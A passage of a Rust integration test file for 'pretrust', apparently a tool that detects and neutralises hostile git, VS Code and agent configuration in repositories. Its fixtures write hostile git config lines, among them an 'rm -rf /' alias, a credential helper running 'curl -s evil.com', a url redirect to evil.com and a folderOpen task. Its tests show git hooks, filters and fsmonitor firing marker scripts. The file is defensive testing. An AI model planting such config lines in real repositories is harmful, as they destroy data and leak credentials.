use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;
use tempfile::{TempDir, tempdir};

fn get_pretrust_bin() -> PathBuf {
    PathBuf::from(env!("CARGO_BIN_EXE_pretrust"))
}

fn copy_dir_all(src: &Path, dst: &Path) -> std::io::Result<()> {
    fs::create_dir_all(dst)?;
    for entry in fs::read_dir(src)? {
        let entry = entry?;
        let ty = entry.file_type()?;
        if entry.file_name() == ".git" {
            continue;
        }
        let from = entry.path();
        let to = dst.join(entry.file_name());
        if ty.is_dir() {
            copy_dir_all(&from, &to)?;
        } else {
            fs::copy(&from, &to)?;
        }
    }
    Ok(())
}

struct HermeticCommand {
    cmd: Command,
    _home: TempDir,
}

impl std::ops::Deref for HermeticCommand {
    type Target = Command;
    fn deref(&self) -> &Self::Target {
        &self.cmd
    }
}

impl std::ops::DerefMut for HermeticCommand {
    fn deref_mut(&mut self) -> &mut Self::Target {
        &mut self.cmd
    }
}

fn apply_hermetic_env(cmd: &mut Command) -> TempDir {
    let temp = tempdir().expect("failed to create hermetic tempdir");
    let empty_gitconfig = temp.path().join("empty_gitconfig");
    fs::write(&empty_gitconfig, "").expect("failed to write empty gitconfig");
    cmd.env("HOME", temp.path())
        .env("XDG_CONFIG_HOME", temp.path())
        .env("GIT_CONFIG_NOSYSTEM", "1")
        .env("GIT_CONFIG_GLOBAL", &empty_gitconfig);
    temp
}

fn hermetic_cmd<P: AsRef<std::ffi::OsStr>>(program: P) -> HermeticCommand {
    let mut cmd = Command::new(program);
    let home = apply_hermetic_env(&mut cmd);
    HermeticCommand { cmd, _home: home }
}

fn copy_fixture(name: &str) -> TempDir {
    let temp = tempdir().expect("failed to create temp dir");

    if name == "unneutralizable_repo" {
        let git_dir = temp.path().join(".git");
        fs::create_dir_all(&git_dir).expect("failed to create .git in temp");
        fs::write(
            git_dir.join("config"),
            "[url \"https://evil.com/\"]\n    insteadOf = https://github.com/\n[alias]\n    pwn = \"!rm -rf /\"\n",
        )
        .expect("failed to write git config in temp");
        return temp;
    }

    let root = Path::new(env!("CARGO_MANIFEST_DIR"));
    let src = root.join("tests").join("fixtures").join(name);
    if !src.is_dir() {
        panic!("fixture directory missing: {}", src.display());
    }
    copy_dir_all(&src, temp.path()).expect("failed to copy fixture directory");

    if name == "vulnerable_repo" {
        let git_dir = temp.path().join(".git");
        fs::create_dir_all(&git_dir).expect("failed to create .git in temp");
        fs::write(
            git_dir.join("config"),
            "[core]\n    fsmonitor = /tmp/evil_fsmonitor.sh\n    hooksPath = /tmp/evil_hooks\n[diff]\n    external = /tmp/evil_diff.sh\n[credential]\n    helper = !curl -s evil.com\n",
        )
        .expect("failed to write git config in temp");
    }

    temp
}

#[test]
fn test_1_config_sink_detection_suite() {
    let bin = get_pretrust_bin();
    let fixture = copy_fixture("vulnerable_repo");
    let output = hermetic_cmd(&bin)
        .args(["scan", fixture.path().to_str().unwrap(), "--json"])
        .output()
        .expect("failed to run scan");

    assert_eq!(output.status.code(), Some(1)); // Has High/Critical findings

    let stdout = String::from_utf8_lossy(&output.stdout);
    let report: serde_json::Value = serde_json::from_str(&stdout).expect("valid json output");

    let findings = report["findings"].as_array().expect("findings array");
    let rules: Vec<&str> = findings
        .iter()
        .filter_map(|f| f["rule_name"].as_str())
        .collect();

    assert!(rules.contains(&"GitFsMonitor"), "Missing GitFsMonitor");
    assert!(rules.contains(&"GitHooksPath"), "Missing GitHooksPath");
    assert!(
        rules.contains(&"GitDiffExternal"),
        "Missing GitDiffExternal"
    );
    assert!(
        rules.contains(&"GitCredentialHelper"),
        "Missing GitCredentialHelper"
    );
    assert!(
        rules.contains(&"VSCodeTasksFolderOpen"),
        "Missing VSCodeTasksFolderOpen"
    );
    assert!(
        rules.contains(&"McpPromptInjection"),
        "Missing McpPromptInjection"
    );
}

#[test]
fn test_2_environment_hardening_isolation_proof() {
    let bin = get_pretrust_bin();
    let dir = tempdir().unwrap();

    // 1. Initialize a real git repository with an initial commit
    let init_status = hermetic_cmd("git")
        .args(["init", "-b", "main"])
        .current_dir(dir.path())
        .status()
        .expect("git init failed");
    assert!(init_status.success());

    hermetic_cmd("git")
        .args(["config", "user.name", "Pretrust Test"])
        .current_dir(dir.path())
        .status()
        .unwrap();
    hermetic_cmd("git")
        .args(["config", "user.email", "test@pretrust.dev"])
        .current_dir(dir.path())
        .status()
        .unwrap();

    let commit_status = hermetic_cmd("git")
        .args(["commit", "--allow-empty", "-m", "initial commit"])
        .current_dir(dir.path())
        .status()
        .expect("git commit failed");
    assert!(commit_status.success());
    let marker_file = dir.path().join("proof_marker.txt");

    #[cfg(windows)]
    let script_file = dir.path().join("proof_of_exec.bat");
    #[cfg(not(windows))]
    let script_file = dir.path().join("proof_of_exec.sh");

    #[cfg(windows)]
    let script_content = format!(
        "@echo off\r\necho FS_FIRED > \"{}\"\r\necho 0\r\n",
        marker_file.display()
    );
    #[cfg(not(windows))]
    let script_content = format!(
        "#!/bin/sh\necho 'FS_FIRED' > {}\necho '0'\n",
        marker_file.display()
    );
    fs::write(&script_file, script_content).unwrap();

    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mut perms = fs::metadata(&script_file).unwrap().permissions();
        perms.set_mode(0o755);
        fs::set_permissions(&script_file, perms).unwrap();
    }

    // Configure core.fsmonitor with forward slashes for cross-platform Git compatibility
    let script_str = script_file.to_str().unwrap().replace('\\', "/");
    let config_status = hermetic_cmd("git")
        .args(["config", "core.fsmonitor", &script_str])
        .current_dir(dir.path())
        .status()
        .expect("git config core.fsmonitor failed");
    assert!(config_status.success());

    // 3. Negative control: run git status WITHOUT pretrust hardening
    let unhardened_output = hermetic_cmd("git")
        .arg("status")
        .current_dir(dir.path())
        .output()
        .expect("unhardened git status failed");
    assert!(unhardened_output.status.success());
    assert!(
        marker_file.is_file(),
        "NEGATIVE CONTROL FAILED: Unhardened git status did not trigger core.fsmonitor script"
    );
    let marker_content = fs::read_to_string(&marker_file).unwrap();
    assert!(marker_content.contains("FS_FIRED"));

    // 4. Reset marker file
    fs::remove_file(&marker_file).unwrap();
    assert!(!marker_file.exists());

    // 5. Positive proof: run git status THROUGH pretrust CLI 'run' command
    let hardened_output = hermetic_cmd(&bin)
        .args(["run", "--", "git", "status"])
        .current_dir(dir.path())
        .output()
        .expect("pretrust run -- git status failed to execute");

    assert!(
        hardened_output.status.success(),
        "pretrust run failed: stderr={}",
        String::from_utf8_lossy(&hardened_output.stderr)
    );

    // CRITICAL PROOF ASSERTION:
    // marker_file MUST NOT exist because pretrust injected core.fsmonitor=false into process scope!
    assert!(
        !marker_file.exists(),
        "SECURITY VIOLATION: Hostile fsmonitor was executed despite running inside 'pretrust run'!"
    );
}

#[test]
fn test_3_tasks_auto_run_detection() {
    let bin = get_pretrust_bin();
    let fixture = copy_fixture("tasks_repo");

    let output = hermetic_cmd(&bin)
        .args(["scan", fixture.path().to_str().unwrap(), "--json"])
        .output()
        .expect("failed to run scan");
    assert_eq!(output.status.code(), Some(1));
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("VSCodeTasksFolderOpen"));
}

#[test]
fn test_4_sarif_output_schema_validation() {
    let bin = get_pretrust_bin();
    let fixture = copy_fixture("vulnerable_repo");

    let output = hermetic_cmd(&bin)
        .args(["scan", fixture.path().to_str().unwrap(), "--sarif"])
        .output()
        .expect("failed to run scan");
    let stdout = String::from_utf8_lossy(&output.stdout);
    let sarif: serde_json::Value = serde_json::from_str(&stdout).expect("valid SARIF json");

    assert_eq!(sarif["version"], "2.1.0");
    assert_eq!(sarif["runs"][0]["tool"]["driver"]["name"], "pretrust");

    let results = sarif["runs"][0]["results"]
        .as_array()
        .expect("results array");
    assert!(results.len() >= 3);
}

#[test]
fn test_5_lockfile_tampering_detection() {
    let bin = get_pretrust_bin();
    let dir = tempdir().unwrap();

    fs::write(dir.path().join("AGENTS.md"), "Standard instruction v1\n").unwrap();
    fs::write(dir.path().join(".cursorrules"), "Rules v1\n").unwrap();

    // 1. Generate lockfile
    let lock_out = hermetic_cmd(&bin)
        .args(["lock", dir.path().to_str().unwrap()])
        .output()
        .expect("failed to run lock");
    assert_eq!(lock_out.status.code(), Some(0));
    assert!(dir.path().join("pretrust.lock").is_file());

    // 2. Clean check
    let check_clean = hermetic_cmd(&bin)
        .args(["lock", "--check", dir.path().to_str().unwrap()])
        .output()
        .expect("failed to check lock");
    assert_eq!(check_clean.status.code(), Some(0));
    // 3. Tamper with file
    fs::write(
        dir.path().join(".cursorrules"),
        "Modified rules with prompt injection\n",
    )
    .unwrap();

    let check_tampered = hermetic_cmd(&bin)
        .args(["lock", "--check", dir.path().to_str().unwrap()])
        .output()
        .expect("failed to check lock");
    let stderr = String::from_utf8_lossy(&check_tampered.stderr);
    assert!(stderr.contains(".cursorrules"));
    assert!(stderr.contains("hash changed"));
}

#[test]
fn test_6_unneutralizable_sink_refusal() {
    let bin = get_pretrust_bin();
    let fixture = copy_fixture("unneutralizable_repo");

    // Run inside unneutralizable_repo
    let refusal_out = hermetic_cmd(&bin)
        .args(["run", "--", "git", "--version"])
        .current_dir(fixture.path())
        .output()
        .expect("failed to run");
    assert_eq!(refusal_out.status.code(), Some(2));
    let stderr = String::from_utf8_lossy(&refusal_out.stderr);
    assert!(stderr.contains("PRETRUST SAFETY REFUSAL"));
    assert!(stderr.contains("GitUrlInsteadOf"));

    // Run with --allow-sinks
    let allow_out = hermetic_cmd(&bin)
        .args(["run", "--allow-sinks", "--", "git", "--version"])
        .current_dir(fixture.path())
        .output()
        .expect("failed to run");
    assert_eq!(allow_out.status.code(), Some(0));
    let stdout = String::from_utf8_lossy(&allow_out.stdout);
    assert!(stdout.contains("git version"));
}

fn scan_json(bin: &Path, target: &Path) -> (Option<i32>, serde_json::Value) {
    let output = hermetic_cmd(bin)
        .args(["scan", target.to_str().unwrap(), "--json"])
        .output()
        .expect("failed to run scan");
    let report = serde_json::from_slice(&output.stdout).expect("valid json output");
    (output.status.code(), report)
}

fn finding_ids(report: &serde_json::Value) -> Vec<String> {
    report["findings"]
        .as_array()
        .expect("findings array")
        .iter()
        .map(|f| f["id"].as_str().expect("finding id").to_string())
        .collect()
}

#[test]
fn test_7_agent_config_rules_are_catalogued() {
    let bin = get_pretrust_bin();
    let fixture = copy_fixture("vulnerable_repo");
    let rules_out = hermetic_cmd(&bin)
        .args(["rules", "--json"])
        .output()
        .expect("failed to run rules");
    let catalog: serde_json::Value =
        serde_json::from_slice(&rules_out.stdout).expect("valid catalog json");
    let catalog_ids: Vec<&str> = catalog["rules"]
        .as_array()
        .expect("rules array")
        .iter()
        .map(|r| r["id"].as_str().expect("rule id"))
        .collect();
    let unique: std::collections::HashSet<&str> = catalog_ids.iter().copied().collect();
    assert_eq!(
        unique.len(),
        catalog_ids.len(),
        "duplicate rule IDs in catalog"
    );

    let (code, report) = scan_json(&bin, fixture.path());
    assert_eq!(code, Some(1));
    let ids = finding_ids(&report);
    for required in [
        "PT-MCP-003",
        "PT-MCP-004",
        "PT-MCP-005",
        "PT-CLAUDE-001",
        "PT-CLAUDE-003",
        "PT-VSCODE-001",
    ] {
        assert!(
            ids.iter().any(|id| id == required),
            "vulnerable_repo missing {required}"
        );
    }
    for id in &ids {
        assert!(
            unique.contains(id.as_str()),
            "emitted rule {id} is not in the catalog"
        );
    }

    // The committed fake secret must never appear in full in the report.
    assert!(
        !serde_json::to_string(&report)
            .unwrap()
            .contains("FAKE_TEST_SECRET_0123456789abcdef")
    );
}

#[test]
fn test_8_clean_look_alike_configs_have_no_findings() {
    let bin = get_pretrust_bin();
    let fixture = copy_fixture("clean_repo");
    let (code, report) = scan_json(&bin, fixture.path());
    assert_eq!(finding_ids(&report), Vec::<String>::new());
    assert_eq!(code, Some(0));
}

#[test]
#[should_panic(expected = "fixture directory missing")]
fn test_fixture_missing_panics() {
    copy_fixture("nonexistent_fixture_dir_definitely_missing");
}

#[test]
fn test_9_vscode_tasks_bom_and_lossy_utf8_detection() {
    let bin = get_pretrust_bin();

    // 1. tasks.json with UTF-8 BOM + runOn: folderOpen
    let dir_bom = tempdir().unwrap();
    let vscode_bom = dir_bom.path().join(".vscode");
    fs::create_dir_all(&vscode_bom).unwrap();
    let bom_tasks = "\u{FEFF}{\"version\":\"2.0.0\",\"tasks\":[{\"label\":\"test\",\"type\":\"shell\",\"command\":\"evil.sh\",\"runOptions\":{\"runOn\":\"folderOpen\"}}]}";
    fs::write(vscode_bom.join("tasks.json"), bom_tasks).unwrap();

    let (code_bom, report_bom) = scan_json(&bin, dir_bom.path());
    assert_eq!(code_bom, Some(1));
    let ids_bom = finding_ids(&report_bom);
    assert!(ids_bom.iter().any(|id| id == "PT-TASK-001"));

    // 2. tasks.json with invalid UTF-8 byte in a comment + runOn: folderOpen
    let dir_lossy = tempdir().unwrap();
    let vscode_lossy = dir_lossy.path().join(".vscode");
    fs::create_dir_all(&vscode_lossy).unwrap();
    let mut lossy_bytes = Vec::new();
    lossy_bytes.extend_from_slice(b"// Comment with invalid byte \xFF\n");
    lossy_bytes.extend_from_slice(br#"{"version":"2.0.0","tasks":[{"label":"test","type":"shell","command":"evil.sh","runOptions":{"runOn":"folderOpen"}}]}"#);
    fs::write(vscode_lossy.join("tasks.json"), &lossy_bytes).unwrap();

    let (code_lossy, report_lossy) = scan_json(&bin, dir_lossy.path());
    assert_eq!(code_lossy, Some(1));
    let ids_lossy = finding_ids(&report_lossy);
    assert!(ids_lossy.iter().any(|id| id == "PT-TASK-001"));
}

#[test]
fn test_10_malformed_json_emits_pt_cfg_001_and_refuses_run_and_hooks() {
    use std::io::Write;
    let bin = get_pretrust_bin();

    let dir = tempdir().unwrap();
    let vscode = dir.path().join(".vscode");
    fs::create_dir_all(&vscode).unwrap();
    fs::write(vscode.join("tasks.json"), "{ malformed json: true").unwrap();

    // 1. Scan emits blocking PT-CFG-001
    let (code, report) = scan_json(&bin, dir.path());
    assert_eq!(code, Some(1));
    let ids = finding_ids(&report);
    assert!(ids.iter().any(|id| id == "PT-CFG-001"));

    // 2. Run exits 2 due to blocking finding
    let run_out = hermetic_cmd(&bin)
        .args(["run", "--", "echo", "safe_command"])
        .current_dir(dir.path())
        .output()
        .expect("run command failed");
    assert_eq!(run_out.status.code(), Some(2));
    let run_stderr = String::from_utf8_lossy(&run_out.stderr);
    assert!(run_stderr.contains("PRETRUST SAFETY REFUSAL"));

    // 3. Claude hook exits 2 for obfuscated command `g""it status`
    let mut claude_obf = hermetic_cmd(&bin)
        .args(["hook", "claude"])
        .current_dir(dir.path())
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
        .expect("failed to spawn claude hook");
    {
        let stdin = claude_obf.stdin.as_mut().unwrap();
        stdin
            .write_all(br#"{"hook_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"g\"\"it status"}}"#)
            .unwrap();
    }
    let claude_obf_out = claude_obf.wait_with_output().unwrap();
    assert_eq!(claude_obf_out.status.code(), Some(2));
    let claude_stderr = String::from_utf8_lossy(&claude_obf_out.stderr);
    assert!(claude_stderr.contains("Blocked execution"));

    // 4. Claude hook exits 2 for invalid JSON payload on stdin
    let mut claude_invalid = hermetic_cmd(&bin)
        .args(["hook", "claude"])
        .current_dir(dir.path())
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
        .expect("failed to spawn claude hook");
    {
        let stdin = claude_invalid.stdin.as_mut().unwrap();
        stdin.write_all(b"{\"invalid_json:").unwrap();
    }
    let claude_invalid_out = claude_invalid.wait_with_output().unwrap();
    assert_eq!(claude_invalid_out.status.code(), Some(2));
    let claude_invalid_err = String::from_utf8_lossy(&claude_invalid_out.stderr);
    assert!(claude_invalid_err.contains("Invalid JSON payload"));
}

fn init_test_git_repo(dir: &Path) {
    let init_status = hermetic_cmd("git")
        .args(["init", "-b", "main"])
        .current_dir(dir)
        .status()
        .expect("git init failed");
    assert!(init_status.success());

    hermetic_cmd("git")
        .args(["config", "user.name", "Pretrust Test"])
        .current_dir(dir)
        .status()
        .unwrap();
    hermetic_cmd("git")
        .args(["config", "user.email", "test@example.invalid"])
        .current_dir(dir)
        .status()
        .unwrap();
}

fn write_executable_marker_script(
    script_path: &Path,
    marker_path: &Path,
    marker_text: &str,
    passthrough_stdin: bool,
) {
    #[cfg(windows)]
    {
        let content = if passthrough_stdin {
            format!(
                "@echo off\r\necho {} > \"{}\"\r\nmore\r\n",
                marker_text,
                marker_path.display()
            )
        } else {
            format!(
                "@echo off\r\necho {} > \"{}\"\r\n",
                marker_text,
                marker_path.display()
            )
        };
        fs::write(script_path, content).unwrap();
    }
    #[cfg(not(windows))]
    {
        let content = if passthrough_stdin {
            format!(
                "#!/bin/sh\necho '{}' > \"{}\"\ncat\n",
                marker_text,
                marker_path.display()
            )
        } else {
            format!(
                "#!/bin/sh\necho '{}' > \"{}\"\n",
                marker_text,
                marker_path.display()
            )
        };
        fs::write(script_path, content).unwrap();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mut perms = fs::metadata(script_path).unwrap().permissions();
            perms.set_mode(0o755);
            fs::set_permissions(script_path, perms).unwrap();
        }
    }
}

fn write_hook_marker_script(script_path: &Path, marker_path: &Path, marker_text: &str) {
    let marker_path_str = marker_path.to_str().unwrap().replace('\\', "/");
    let content = format!(
        "#!/bin/sh\necho '{}' > \"{}\"\n",
        marker_text, marker_path_str
    );
    fs::write(script_path, content).unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mut perms = fs::metadata(script_path).unwrap().permissions();
        perms.set_mode(0o755);
        fs::set_permissions(script_path, perms).unwrap();
    }
}

fn write_textconv_marker_script(script_path: &Path, marker_path: &Path, marker_text: &str) {
    let marker_path_str = marker_path.to_str().unwrap().replace('\\', "/");
    let content = format!(
        "#!/bin/sh\necho '{}' > \"{}\"\ncat \"$1\"\n",
        marker_text, marker_path_str
    );
    fs::write(script_path, content).unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mut perms = fs::metadata(script_path).unwrap().permissions();
        perms.set_mode(0o755);
        fs::set_permissions(script_path, perms).unwrap();
    }
}

#[test]
fn test_11_core_hookspath_pre_commit_isolation_proof() {
    let bin = get_pretrust_bin();
    let dir = tempdir().unwrap();
    init_test_git_repo(dir.path());

    let marker_file = dir.path().join("hook_marker.txt");
    let hooks_dir = dir.path().join("custom_hooks");
    fs::create_dir_all(&hooks_dir).unwrap();

    let script_file = hooks_dir.join("pre-commit");

    write_hook_marker_script(&script_file, &marker_file, "HOOK_FIRED");

    let hooks_dir_str = hooks_dir.to_str().unwrap().replace('\\', "/");
    let config_output = hermetic_cmd("git")
        .args(["config", "core.hooksPath", &hooks_dir_str])
        .current_dir(dir.path())
        .output()
        .expect("git config core.hooksPath failed");
    assert!(
        config_output.status.success(),
        "git config core.hooksPath failed (exit {:?}):\nstdout: {}\nstderr: {}",
        config_output.status.code(),
        String::from_utf8_lossy(&config_output.stdout),
        String::from_utf8_lossy(&config_output.stderr)
    );

    // 1. Negative control: raw git commit executes hook and writes marker
    let unhardened_output = hermetic_cmd("git")
        .args(["commit", "--allow-empty", "-m", "unhardened commit"])
        .current_dir(dir.path())
        .output()
        .expect("unhardened git commit failed");
    assert!(
        unhardened_output.status.success(),
        "unhardened git commit failed (exit {:?}):\nstdout: {}\nstderr: {}",
        unhardened_output.status.code(),
        String::from_utf8_lossy(&unhardened_output.stdout),
        String::from_utf8_lossy(&unhardened_output.stderr)
    );
    assert!(
        marker_file.is_file(),
        "NEGATIVE CONTROL FAILED: Unhardened git commit did not trigger core.hooksPath pre-commit hook (exit {:?}):\nstdout: {}\nstderr: {}",
        unhardened_output.status.code(),
        String::from_utf8_lossy(&unhardened_output.stdout),
        String::from_utf8_lossy(&unhardened_output.stderr)
    );
    let marker_content = fs::read_to_string(&marker_file).unwrap();
    assert!(marker_content.contains("HOOK_FIRED"));

    // 2. Reset marker
    fs::remove_file(&marker_file).unwrap();
    assert!(!marker_file.exists());

    // 3. Positive proof: pretrust run executes commit with neutralized hooksPath
    let hardened_output = hermetic_cmd(&bin)
        .args([
            "run",
            "--",
            "git",
            "commit",
            "--allow-empty",
            "-m",
            "hardened commit",
        ])
        .current_dir(dir.path())
        .output()
        .expect("pretrust run git commit failed");
    assert!(
        hardened_output.status.success(),
        "pretrust run failed (exit {:?}):\nstdout: {}\nstderr: {}",
        hardened_output.status.code(),
        String::from_utf8_lossy(&hardened_output.stdout),
        String::from_utf8_lossy(&hardened_output.stderr)
    );
    assert!(
        !marker_file.exists(),
        "SECURITY VIOLATION: Hostile pre-commit hook executed inside 'pretrust run'!"
    );
}

#[test]
fn test_12_diff_external_isolation_proof() {
    let bin = get_pretrust_bin();
    let dir = tempdir().unwrap();
    init_test_git_repo(dir.path());

    let tracked = dir.path().join("file.txt");
    fs::write(&tracked, "version 1\n").unwrap();
    hermetic_cmd("git")
        .args(["add", "file.txt"])
        .current_dir(dir.path())
        .status()
        .unwrap();
    hermetic_cmd("git")
        .args(["commit", "-m", "initial"])
        .current_dir(dir.path())
        .status()
        .unwrap();
    fs::write(&tracked, "version 2\n").unwrap();

    let marker_file = dir.path().join("diff_marker.txt");
    #[cfg(windows)]
    let script_file = dir.path().join("diff_external.bat");
    #[cfg(not(windows))]
    let script_file = dir.path().join("diff_external.sh");

    write_executable_marker_script(&script_file, &marker_file, "DIFF_EXTERNAL_FIRED", false);

    let script_str = script_file.to_str().unwrap().replace('\\', "/");
    let config_status = hermetic_cmd("git")
        .args(["config", "diff.external", &script_str])
        .current_dir(dir.path())
        .status()
        .expect("git config diff.external failed");
    assert!(config_status.success());

    // 1. Negative control: raw git diff triggers diff.external
    let unhardened_output = hermetic_cmd("git")
        .arg("diff")
        .current_dir(dir.path())
        .output()
        .expect("unhardened git diff failed");
    assert!(unhardened_output.status.success());
    assert!(
        marker_file.is_file(),
        "NEGATIVE CONTROL FAILED: Unhardened git diff did not trigger diff.external script"
    );
    let marker_content = fs::read_to_string(&marker_file).unwrap();
    assert!(marker_content.contains("DIFF_EXTERNAL_FIRED"));

    // 2. Reset marker
    fs::remove_file(&marker_file).unwrap();
    assert!(!marker_file.exists());

    // 3. Positive proof: pretrust run executes git diff without invoking external diff
    let hardened_output = hermetic_cmd(&bin)
        .args(["run", "--", "git", "diff"])
        .current_dir(dir.path())
        .output()
        .expect("pretrust run git diff failed");
    assert!(
        hardened_output.status.success(),
        "pretrust run failed: stderr={}",
        String::from_utf8_lossy(&hardened_output.stderr)
    );
    assert!(
        !marker_file.exists(),
        "SECURITY VIOLATION: Hostile diff.external script executed inside 'pretrust run'!"
    );
}

#[test]
fn test_13_diff_driver_textconv_isolation_proof() {
    let bin = get_pretrust_bin();
    let dir = tempdir().unwrap();
    init_test_git_repo(dir.path());

    let marker_file = dir.path().join("textconv_marker.txt");
    let script_file = dir.path().join("custom_textconv.sh");

    write_textconv_marker_script(&script_file, &marker_file, "TEXTCONV_FIRED");

    let script_str = script_file.to_str().unwrap().replace('\\', "/");
    let textconv_cmd = format!("sh \"{}\"", script_str);
    let config_output = hermetic_cmd("git")
        .args(["config", "diff.custom_driver.textconv", &textconv_cmd])
        .current_dir(dir.path())
        .output()
        .expect("git config diff.custom_driver.textconv failed");
    assert!(
        config_output.status.success(),
        "git config diff.custom_driver.textconv failed (exit {:?}):\nstdout: {}\nstderr: {}",
        config_output.status.code(),
        String::from_utf8_lossy(&config_output.stdout),
        String::from_utf8_lossy(&config_output.stderr)
    );

    fs::write(
        dir.path().join(".gitattributes"),
        "*.bin diff=custom_driver\n",
    )
    .unwrap();
    let bin_file = dir.path().join("data.bin");
    fs::write(&bin_file, "binary payload 1\n").unwrap();
    let add_output = hermetic_cmd("git")
        .args(["add", ".gitattributes", "data.bin"])
        .current_dir(dir.path())
        .output()
        .expect("git add failed");
    assert!(
        add_output.status.success(),
        "git add failed (exit {:?}):\nstdout: {}\nstderr: {}",
        add_output.status.code(),
        String::from_utf8_lossy(&add_output.stdout),
        String::from_utf8_lossy(&add_output.stderr)
    );
    let commit_output = hermetic_cmd("git")
        .args(["commit", "-m", "init binary data"])
        .current_dir(dir.path())
        .output()
        .expect("git commit failed");
    assert!(
        commit_output.status.success(),
        "git commit failed (exit {:?}):\nstdout: {}\nstderr: {}",
        commit_output.status.code(),
        String::from_utf8_lossy(&commit_output.stdout),
        String::from_utf8_lossy(&commit_output.stderr)
    );

    fs::write(&bin_file, "binary payload 2\n").unwrap();

    // 1. Negative control: raw git diff executes textconv driver
    let unhardened_output = hermetic_cmd("git")
        .arg("diff")
        .current_dir(dir.path())
        .output()
        .expect("unhardened git diff failed");
    assert!(
        unhardened_output.status.success(),
        "unhardened git diff failed (exit {:?}):\nstdout: {}\nstderr: {}",
        unhardened_output.status.code(),
        String::from_utf8_lossy(&unhardened_output.stdout),
        String::from_utf8_lossy(&unhardened_output.stderr)
    );
    assert!(
        marker_file.is_file(),
        "NEGATIVE CONTROL FAILED: Unhardened git diff did not trigger diff driver textconv (exit {:?}):\nstdout: {}\nstderr: {}",
        unhardened_output.status.code(),
        String::from_utf8_lossy(&unhardened_output.stdout),
        String::from_utf8_lossy(&unhardened_output.stderr)
    );
    let marker_content = fs::read_to_string(&marker_file).unwrap();
    assert!(marker_content.contains("TEXTCONV_FIRED"));

    // 2. Reset marker
    fs::remove_file(&marker_file).unwrap();
    assert!(!marker_file.exists());

    // 3. Positive proof: pretrust run executes git diff without invoking textconv driver
    let hardened_output = hermetic_cmd(&bin)
        .args(["run", "--", "git", "diff"])
        .current_dir(dir.path())
        .output()
        .expect("pretrust run git diff failed");
    assert!(
        hardened_output.status.success(),
        "pretrust run failed (exit {:?}):\nstdout: {}\nstderr: {}",
        hardened_output.status.code(),
        String::from_utf8_lossy(&hardened_output.stdout),
        String::from_utf8_lossy(&hardened_output.stderr)
    );
    assert!(
        !marker_file.exists(),
        "SECURITY VIOLATION: Hostile diff driver textconv executed inside 'pretrust run'!"
    );
}

#[test]
fn test_14_filter_clean_isolation_proof() {
    let bin = get_pretrust_bin();
    let dir = tempdir().unwrap();
    init_test_git_repo(dir.path());

    let marker_file = dir.path().join("clean_marker.txt");
    #[cfg(windows)]
    let script_file = dir.path().join("clean_filter.bat");
    #[cfg(not(windows))]
    let script_file = dir.path().join("clean_filter.sh");

    write_executable_marker_script(&script_file, &marker_file, "FILTER_CLEAN_FIRED", true);

    let script_str = script_file.to_str().unwrap().replace('\\', "/");
    let config_status = hermetic_cmd("git")
        .args(["config", "filter.custom_filter.clean", &script_str])
        .current_dir(dir.path())
        .status()
        .expect("git config filter.custom_filter.clean failed");
    assert!(config_status.success());

    fs::write(
        dir.path().join(".gitattributes"),
        "*.txt filter=custom_filter\n",
    )
    .unwrap();
    let txt_file = dir.path().join("file.txt");
    fs::write(&txt_file, "content to clean\n").unwrap();

    // 1. Negative control: raw git add triggers filter clean
    let unhardened_output = hermetic_cmd("git")
        .args(["add", "file.txt"])
        .current_dir(dir.path())
        .output()
        .expect("unhardened git add failed");
    assert!(unhardened_output.status.success());
    assert!(
        marker_file.is_file(),
        "NEGATIVE CONTROL FAILED: Unhardened git add did not trigger filter clean script"
    );
    let marker_content = fs::read_to_string(&marker_file).unwrap();
    assert!(marker_content.contains("FILTER_CLEAN_FIRED"));

    // 2. Reset marker and reset staged file
    fs::remove_file(&marker_file).unwrap();
    assert!(!marker_file.exists());
    hermetic_cmd("git")
        .args(["reset"])
        .current_dir(dir.path())
        .status()
        .unwrap();
    fs::write(&txt_file, "content to clean 2\n").unwrap();

    // 3. Positive proof: pretrust run executes git add with neutralized filter
    let hardened_output = hermetic_cmd(&bin)
        .args(["run", "--", "git", "add", "file.txt"])
        .current_dir(dir.path())
        .output()
        .expect("pretrust run git add failed");
    assert!(
        hardened_output.status.success(),
        "pretrust run failed: stderr={}",
        String::from_utf8_lossy(&hardened_output.stderr)
    );
    assert!(
        !marker_file.exists(),
        "SECURITY VIOLATION: Hostile filter clean script executed inside 'pretrust run'!"
    );
}

#[test]
fn test_15_filter_smudge_isolation_proof() {
    let bin = get_pretrust_bin();
    let dir = tempdir().unwrap();
    init_test_git_repo(dir.path());

    let marker_file = dir.path().join("smudge_marker.txt");
    #[cfg(windows)]
    let script_file = dir.path().join("smudge_filter.bat");
    #[cfg(not(windows))]
    let script_file = dir.path().join("smudge_filter.sh");

    write_executable_marker_script(&script_file, &marker_file, "FILTER_SMUDGE_FIRED", true);

    let script_str = script_file.to_str().unwrap().replace('\\', "/");
    let config_status = hermetic_cmd("git")
        .args(["config", "filter.custom_filter.smudge", &script_str])
        .current_dir(dir.path())
        .status()
        .expect("git config filter.custom_filter.smudge failed");
    assert!(config_status.success());

    fs::write(
        dir.path().join(".gitattributes"),
        "*.txt filter=custom_filter\n",
    )
    .unwrap();
    let txt_file = dir.path().join("file.txt");
    fs::write(&txt_file, "content to smudge\n").unwrap();
    hermetic_cmd("git")
        .args(["add", ".gitattributes", "file.txt"])
        .current_dir(dir.path())
        .status()
        .unwrap();
    hermetic_cmd("git")
        .args(["commit", "-m", "init smudge file"])
        .current_dir(dir.path())
        .status()
        .unwrap();

    // Remove working copy to force checkout to smudge
    fs::remove_file(&txt_file).unwrap();

    // 1. Negative control: raw git checkout triggers filter smudge
    let unhardened_output = hermetic_cmd("git")
        .args(["checkout", "--", "file.txt"])
        .current_dir(dir.path())
        .output()
        .expect("unhardened git checkout failed");
    assert!(unhardened_output.status.success());
    assert!(
        marker_file.is_file(),
        "NEGATIVE CONTROL FAILED: Unhardened git checkout did not trigger filter smudge script"
    );
    let marker_content = fs::read_to_string(&marker_file).unwrap();
